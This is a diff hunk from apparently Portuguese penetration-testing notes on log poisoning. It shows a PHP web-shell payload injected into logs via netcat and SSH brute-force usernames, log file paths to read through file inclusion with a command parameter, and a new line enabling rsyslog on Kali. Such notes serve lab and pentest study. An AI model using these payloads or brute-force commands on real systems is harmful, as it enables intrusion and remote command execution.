@@ -4277,6 +4277,7 @@ Para acesso ao log injetar via `nc -v 192.168.1.10 80 -C` a shell `<?php system(
         nmap -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=pas.txt,ssh-brute.timeout=4s 192.168.161.75 PAYLOAD '<?php system($_GET['kid']);?>' VAI DENTRO DE USERS
 
 Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /var/spool/mail/www-data&kid=ls -la
+Kali linux nao guarda mais o `auth.log` automaticamente, sendo assim, habilite: `sudo apt update && sudo apt install rsyslog -y && sudo systemctl enable --now rsyslog`
 
 	telnet 192.200.0.128 25                                      
 
